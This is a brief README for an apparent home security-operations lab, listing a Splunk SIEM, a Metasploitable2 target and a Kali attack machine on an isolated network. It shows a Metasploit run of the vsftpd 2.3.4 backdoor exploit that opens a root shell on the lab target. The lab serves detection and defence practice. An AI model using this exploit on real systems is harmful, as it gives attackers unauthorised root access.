# FinBank SOC

## Architecture & Asset Roles
- **FINBANK-SIEM (Ubuntu):** Log Aggregator & Analysis (Splunk Enterprise).
- **FINBANK-SRV (Metasploitable2):** Target Asset / Internal Web Server.
- **FINBANK-ATTACK (Kali Linux):** Security Testing & Attack Simulation.

## Network Configuration
- **Subnet:** Isolated Lab Network (Host-Only)
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[+] 192.168.56.105:21 - Backdoor service has been spawned
[*] Command shell session 1 opened
whoami
root
id
uid=0(root) gid=0(root)
hostname
metasploitable
